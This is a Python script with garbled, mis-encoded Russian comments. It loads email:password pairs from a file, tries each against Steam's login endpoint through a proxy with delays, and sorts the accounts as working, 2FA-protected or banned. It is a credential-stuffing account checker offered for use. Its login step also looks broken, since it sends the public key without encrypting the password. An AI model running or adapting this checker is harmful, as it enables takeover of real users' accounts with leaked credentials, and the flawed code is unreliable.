import requests
from bs4 import BeautifulSoup
import time
from datetime import datetime

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏
PROXY = {
    "http": "http://–≤–∞—à_–ª–æ–≥–∏–Ω:–≤–∞—à_–ø–∞—Ä–æ–ª—å@ip_–ø—Ä–æ–∫—Å–∏:–ø–æ—Ä—Ç",  # –ü—Ä–∏–º–µ—Ä: "http://user:pass@123.123.123.123:8080"
    "https": "http://–≤–∞—à_–ª–æ–≥–∏–Ω:–≤–∞—à_–ø–∞—Ä–æ–ª—å@ip_–ø—Ä–æ–∫—Å–∏:–ø–æ—Ä—Ç"
}
DELAY_SECONDS = 10  # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏
INPUT_FILE = "accounts.txt"  # –§–∞–π–ª —Å –¥–∞–Ω–Ω—ã–º–∏ –≤ —Ñ–æ—Ä–º–∞—Ç–µ email:password
OUTPUT_FILE = "steam_report.txt"  # –§–∞–π–ª –¥–ª—è –æ—Ç—á—ë—Ç–∞

def load_accounts(filename):
    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç –∞–∫–∫–∞—É–Ω—Ç—ã –∏–∑ —Ñ–∞–π–ª–∞ –≤ —Ñ–æ—Ä–º–∞—Ç–µ email:password"""
    accounts = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                login, password = line.split(':', 1)
                accounts.append({"login": login.strip(), "password": password.strip()})
    return accounts

def check_steam_account(session, login, password):
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å –∞–∫–∫–∞—É–Ω—Ç–∞ Steam"""
    try:
        # –ü–æ–ª—É—á–∞–µ–º CSRF-—Ç–æ–∫–µ–Ω
        login_page = session.get("https://store.steampowered.com/login", timeout=10)
        soup = BeautifulSoup(login_page.text, 'html.parser')
        rsapubkey = soup.find('input', {'name': 'rsapubkey'})['value']
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –≤—Ö–æ–¥–∞
        data = {
            "username": login,
            "password": password,
            "rsapubkey": rsapubkey,
            "remember_login": "true",
            "donotcache": str(int(time.time() * 1000)),
        }
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å
        response = session.post(
            "https://store.steampowered.com/login/dologin/",
            data=data,
            headers={"Referer": "https://store.steampowered.com/login"}
        ).json()
        
        # –ê–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º –æ—Ç–≤–µ—Ç
        if response.get("success"):
            return "‚úÖ –†–∞–±–æ—á–∏–π"
        elif "requires_twofactor" in response:
            return "‚ö†Ô∏è –¢—Ä–µ–±—É–µ—Ç—Å—è 2FA"
        elif "message" in response:
            if "VAC" in response["message"]:
                return "‚õî VAC Ban"
            elif "community ban" in response["message"].lower():
                return "‚õî Community Ban"
            return f"‚ùå {response['message']}"
        return "‚ùì –ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –æ—Ç–≤–µ—Ç"
        
    except Exception as e:
        return f"üî¥ –û—à–∏–±–∫–∞: {str(e)}"

def main():
    accounts = load_accounts(INPUT_FILE)
    if not accounts:
        print(f"–§–∞–π–ª {INPUT_FILE} –ø—É—Å—Ç –∏–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω!")
        return

    with open(OUTPUT_FILE, "a", encoding="utf-8") as f_out:
        f_out.write(f"\n\n=== –û—Ç—á—ë—Ç –æ—Ç {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        
        with requests.Session() as session:
            session.proxies = PROXY
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            })
            
            for acc in accounts:
                status = check_steam_account(session, acc["login"], acc["password"])
                report_line = f"{acc['login']}: {status}"
                print(report_line)
                f_out.write(report_line + "\n")
                f_out.flush()
                
                if DELAY_SECONDS > 0 and acc != accounts[-1]:
                    time.sleep(DELAY_SECONDS)

if __name__ == "__main__":
    print(f"–ó–∞–≥—Ä—É–∑–∫–∞ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –∏–∑ —Ñ–∞–π–ª–∞ {INPUT_FILE}...")
    main()
    print(f"\n–û—Ç—á—ë—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ {OUTPUT_FILE}")